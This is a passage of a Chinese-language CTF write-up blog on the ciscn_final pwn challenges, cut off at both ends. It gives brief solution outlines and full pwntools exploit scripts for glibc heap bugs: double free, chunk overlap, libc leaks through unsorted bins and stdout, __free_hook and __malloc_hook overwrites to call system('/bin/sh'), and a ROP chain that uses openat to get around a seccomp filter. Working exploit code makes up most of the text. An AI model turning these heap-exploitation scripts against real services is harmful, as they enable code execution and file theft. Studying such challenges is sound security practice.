class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_addr_low = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> heap_addr_low &lt; <span class="number">0</span>:</span><br><span class="line">    heap_addr_low += <span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enough space</span></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x501</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x21</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">new(<span class="number">1</span>, heap_addr_low + <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena_low = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> main_arena_low &lt; <span class="number">0</span>:</span><br><span class="line">    main_arena_low += <span class="number">0x100000000</span></span><br><span class="line">libc_base_low = main_arena_low - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">libc_stdin_low = libc_base_low + stdin_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># avoid fastbin</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">2</span>, heap_addr_low + <span class="number">0x150</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># partial write</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, (libc_stdin_low + <span class="number">112</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">666</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_addr_low: "</span> + hex(heap_addr_low))</span><br><span class="line">success(<span class="string">"libc_base_low: "</span> + hex(libc_base_low))</span><br><span class="line">success(<span class="string">"libc_stdin_low: "</span> + hex(libc_stdin_low))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>题目逻辑简单，但是我还是要花一定时间做堆的布局，还是没有特别熟练，还得练。</p>
<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><ol>
<li>明显的<code>free</code>之后指针没有清空，造成可以double free。</li>
<li>因为没有传统的那种<code>show</code>功能，因为要爆破写<code>stdout</code>，后面发现每次<code>new</code>一个chunk都会输出chunk的地址，那就好办了。</li>
<li>这里因为size限制最大为0x78，没办法直接得到unsorted bin，所以还要通过chunk overlap来改size，创造出unsorted bin来。</li>
<li>后面主要就是让tcache bin和unsorted bin重叠，然后就能通过tcache bin分配到<code>main_arena+0x60</code>的chunk，从而通过打印的chunk地址，leak libc。</li>
<li>最后继续利用double free改<code>__free_hook</code>为<code>system</code>来getshell。</li>
</ol>
<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the index"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"input the size"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"now you can write something"</span>, content)</span><br><span class="line">    p.recvuntil(<span class="string">"gift :0x"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the index"</span>, str(index))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite size</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x18</span>, <span class="string">'\x80'</span>)</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x18</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># enough space</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x48</span>, <span class="string">"CCCC"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    new(i + <span class="number">6</span>, <span class="number">0x78</span>, <span class="string">'CCCC'</span>)</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># avoid fastbin</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">new(<span class="number">15</span>, <span class="number">0x28</span>, <span class="string">"CCCC"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">new(<span class="number">16</span>, <span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">new(<span class="number">17</span>, <span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"><span class="comment"># don't break the unsorted bin</span></span><br><span class="line">new(<span class="number">18</span>, <span class="number">0x78</span>, <span class="string">'\xa0'</span>) </span><br><span class="line">new(<span class="number">19</span>, <span class="number">0x78</span>, <span class="string">"\x00"</span>)</span><br><span class="line">main_arena = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">new(<span class="number">20</span>, <span class="number">0x78</span>, p64(__free_hook))</span><br><span class="line">new(<span class="number">21</span>, <span class="number">0x78</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">new(<span class="number">22</span>, <span class="number">0x78</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-final-4"><a href="#ciscn-final-4" class="headerlink" title="ciscn_final_4"></a>ciscn_final_4</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>关键就在于这个<code>open</code>被禁用，可以用<code>openat</code>代替。</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><ol>
<li><code>seccomp-tools dump ciscn_final_4</code>，禁用了<code>execve</code>，显然要orw了。</li>
<li>binary中的<code>watch</code>函数同时也检测了几个系统调用，也就是不能用： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">watch</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+34h] [rbp-ECh]</span></span><br><span class="line">    __int64 v2; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">    <span class="keyword">char</span> v3; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">    __int64 v4; <span class="comment">// [rsp+B8h] [rbp-68h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_SYSCALL, a1, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        waitpid(a1, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !(stat_loc &amp; <span class="number">0x7F</span>) || (<span class="keyword">char</span>)((stat_loc &amp; <span class="number">0x7F</span>) + <span class="number">1</span>) &gt;&gt; <span class="number">1</span> &gt; <span class="number">0</span> || (stat_loc &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span> != <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        ptrace(PTRACE_GETREGS, a1, <span class="number">0L</span>L, &amp;v3);</span><br><span class="line">        v2 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 == <span class="number">2</span> || v2 == <span class="number">9</span> || v2 == <span class="number">57</span> || v2 == <span class="number">58</span> || v2 == <span class="number">101</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"hey! what are you doing?"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 禁用了<code>open</code>(2)，<code>mmap</code>(9)，<code>fork</code>(57)，<code>vfork</code>(58)，<code>ptrace</code>(101)系统调用。</li>
<li>patch掉<code>ptrace(TRACEME, xxx, xxx)</code>，方便调试<code>fork</code>出来的子进程。</li>
<li>明显的fastbin double free，利用unsorted bin来leak出libc地址，之后利用fastbin attack分配到<code>__malloc_hook</code></li>
<li>在<code>__malloc_hook</code>布置如下的gadget，目的是将栈下压0x38字节，此时<code>rsp</code>正好只想binary开始我们输入<code>name</code>的位置，因此是可控的，可以提前布置rop chain。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401186 loc_401186:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000401186                 add     rsp, 8</span><br><span class="line">.text:000000000040118A                 pop     rbx</span><br><span class="line">.text:000000000040118B                 pop     rbp</span><br><span class="line">.text:000000000040118C                 pop     r12</span><br><span class="line">.text:000000000040118E                 pop     r13</span><br><span class="line">.text:0000000000401190                 pop     r14</span><br><span class="line">.text:0000000000401192                 pop     r15</span><br><span class="line">.text:0000000000401194                 retn</span><br></pre></td></tr></table></figure></li>
<li>在binary最开始输入<code>name</code>时布置gadget，完成向bss中写入第二段rop chain，同时将栈迁移到该bss上。</li>
<li>由于<code>open</code>的禁用，故不可用来打开<code>flag</code>文件。因此这里可以使用<code>openat</code>函数，因为<code>open</code>的内部实际上也是通过<code>openat</code>函数实现打开文件的功能的，因此单独调用<code>openat</code>可以绕过<code>open</code>的限制，也能打开文件。</li>
<li>接下来就是orw拿flag了。</li>
</ol>
<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size?"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content?"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(index))</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">openat_offset = libc.sym[<span class="string">"openat"</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">"read"</span>]</span><br><span class="line">write_offset = libc.sym[<span class="string">"write"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf02a4</span></span><br><span class="line">pop_7regs = <span class="number">0x401186</span> <span class="comment"># add rsp, 8; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401193</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401191</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040118d</span> <span class="comment"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdx_offset = <span class="number">0x0000000000001b92</span> <span class="comment"># pop rdx ; ret (in libc)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">bss = elf.bss(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop chain</span></span><br><span class="line">payload = flat([pop_rdi, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss, <span class="number">0</span>])</span><br><span class="line">payload += flat([read_plt])</span><br><span class="line">payload += flat([pop_rsp_r13_r14_r15, bss])</span><br><span class="line">p.sendafter(<span class="string">"what is your name? "</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">new(<span class="number">0x500</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">new(<span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin double free</span></span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">addr = show(<span class="number">0</span>)[:<span class="number">-1</span>]</span><br><span class="line">main_arena = u64(addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x58</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line"><span class="comment"># one_gadget = libc_base + one_gadget_offset</span></span><br><span class="line">pop_rdx = libc_base + pop_rdx_offset</span><br><span class="line">libc_openat = libc_base + openat_offset</span><br><span class="line">libc_read = libc_base + read_offset</span><br><span class="line">libc_write = libc_base + write_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">new(<span class="number">0x68</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"EEEE"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span> * <span class="number">0x13</span> + p64(pop_7regs))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __malloc_hook</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size?"</span>, str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set gadgets on bss (using orw)</span></span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdi, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x100</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0</span>])</span><br><span class="line">payload += flat([libc_openat]) <span class="comment"># open "/flag"</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">3</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x110</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([libc_read]) <span class="comment"># read flag</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">1</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x110</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([libc_write]) <span class="comment"># print flag</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload += <span class="string">"/flag\x00"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"pop_rdx: "</span> + hex(pop_rdx))</span><br><span class="line">success(<span class="string">"libc_write: "</span> + hex(libc_write))</span><br><span class="line">success(<span class="string">"libc_read: "</span> + hex(libc_read))</span><br><span class="line">success(<span class="string">"libc_openat: "</span> + hex(libc_openat))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="ciscn-final-5"><a href="#ciscn-final-5" class="headerlink" title="ciscn_final_5"></a>ciscn_final_5</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>经典没有<code>show</code>的题目，bruteforce 4 bits，partial write unsorted bin-&gt;bk为stdout的做法，主要是堆布局需要点时间，写起来有点pwnable.tw上realloc的感觉了，不过显然更简单。</p>
<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><ol>
<li>利用题目储存<code>chunk</code>地址以及<code>index</code>的逻辑是两者异或之后再存入<code>chunk_array</code>中空闲的地方，若<code>index == 0x10 &amp;&amp; chunk_addr &amp; 0x10 == 0</code>，那么就可以在edit的时候，实际写的地址要向后移0x10 bytes，从而可以溢出到下一个chunk的<code>fd</code>的部分。</li>
<li>利用这个溢出，改掉下一个chunk的size，造成更大的chunk overlap，使得一个chunk同时存在tcache bin和unsorted bin中（间接链入unsorted bin）。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsorted bin --&gt; +--------+</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 +--------+                      +--------+ &lt;-- tcache bin</span><br><span class="line">                 |        | &#x3D;&#x3D;&gt; victim_chunk &lt;&#x3D;&#x3D; |        |</span><br><span class="line">                 +--------+                      +--------+</span><br></pre></td></tr></table></figure></li>
<li>由于在切割unsorted bin，使得victim_chunk的fd，bk被置入<code>main_arena+0x58</code>之后，需要进行partial write，故这里仍要需要利用<code>index == 0x10 &amp;&amp; chunk_addr &amp; 0x10 == 0</code>的方法进行0x10 bytes overflow，从从而可以覆盖到<code>victim_chunk-&gt;fd</code>。</li>
<li>分配到<code>stdout</code>的chunk之后，写入<code>p64(0xfbad1800) + p64(0) * 3 + &quot;\x00&quot;</code>就可以leak libc了。</li>
<li>之后继续利用0x10 bytes overflow，分配<code>__free_hook</code>的chunk，写入<code>system</code>，再<code>free</code>一个”/bin/sh”的chunk，就可以getshell了。</li>
</ol>
<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td 